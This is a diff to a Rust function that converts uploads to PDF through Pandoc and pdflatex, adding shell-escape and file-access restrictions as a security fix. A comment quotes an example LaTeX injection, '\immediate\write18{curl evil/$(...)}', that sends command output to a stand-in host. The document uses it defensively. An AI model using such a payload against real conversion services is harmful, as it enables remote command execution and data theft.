@@ -36,11 +36,26 @@ pub async fn convert_to_pdf(
 ) -> Result<(), AppError> {
     let pandoc_path = find_pandoc()?;
 
+    // SECURITY: pdflatex defaults (in texlive-full) honor `\write18{cmd}`
+    // and `\immediate\write18{cmd}` macros to run arbitrary shell commands
+    // as the server uid. A hostile DOCX / PPTX / RTF / ODT upload could
+    // embed `\immediate\write18{curl evil/$(...)}` and Pandoc would route
+    // it through pdflatex unchanged. Closes 05-file F-01 (Critical).
+    //
+    // The fix passes `-no-shell-escape` as a pdflatex option via
+    // Pandoc's `--pdf-engine-opt`, which Pandoc forwards verbatim to the
+    // engine. We also set `openout_any=p` so pdflatex can only write
+    // into paths underneath the current working directory (which is the
+    // server's temp dir for this conversion).
     let output = Command::new(pandoc_path)
         .arg(input_path)
         .arg("-o")
         .arg(output_path)
-        .arg("--pdf-engine=pdflatex") // or use weasyprint if available
+        .arg("--pdf-engine=pdflatex")
+        .arg("--pdf-engine-opt=-no-shell-escape")
+        .arg("--pdf-engine-opt=-interaction=nonstopmode")
+        .env("openout_any", "p")
+        .env("openin_any", "p")
         .output()
         .map_err(|e| AppError::internal_error(format!("Failed to run Pandoc: {}", e)))?;
 
